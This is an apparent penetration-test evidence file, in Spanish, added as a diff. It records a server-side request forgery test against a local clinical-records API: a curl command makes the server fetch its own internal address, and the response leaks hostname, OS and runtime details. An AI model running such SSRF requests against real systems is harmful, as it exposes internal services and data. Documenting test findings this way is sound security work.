@@ -1,0 +1,22 @@
+# Evidencia evidencia_A10
+
+```text
+# Evidencia A10 - SSRF: el servidor consulta una URL interna
+# Fecha: 2026-10-04 03:40:21   Fase: fase1   Objetivo: localhost
+# Comando: curl -i -s http://localhost:3000/api/fetch-external-record?url=http://127.0.0.1:3000/ -H 'Authorization: <TOKEN_DOCTOR>'
+# Esperado: HTTP 200: el servidor devuelve su propio endpoint interno (127.0.0.1)
+# ----------------------------------------------------------
+HTTP/1.1 200 OK
+X-Powered-By: Express
+Content-Type: application/json; charset=utf-8
+Content-Length: 577
+ETag: W/"241-/V5YdrCKNug7uPz28g4LcEezvFo"
+Date: Sun, 04 Oct 2026 06:40:21 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+
+{"url":"http://127.0.0.1:3000/","status":200,"headers":{"x-powered-by":"Express","content-type":"application/json; charset=utf-8","content-length":"278","etag":"W/\"116-M64c9DOjCvWzpUDqeQ4Evk0PGdk\"","date":"Sun, 04 Oct 2026 06:40:21 GMT","connection":"keep-alive","keep-alive":"timeout=5"},"data":{"app":"API de Recetas e Historiales Clinicos","version":"1.0.0","environment":"development","serverInfo":{"os":"darwin","arch":"arm64","nodeVersion":"v24.21.0","hostname":"MacBook-Pro-de-Hans.local","osRelease":"27.0.0","totalMemory":8589934592,"freeMemory":96878592,"cpus":8}}}
+
+# [curl exit code: 0 (0 = OK, 7 = conexión rechazada, 35/60 = error TLS)]
+
+```
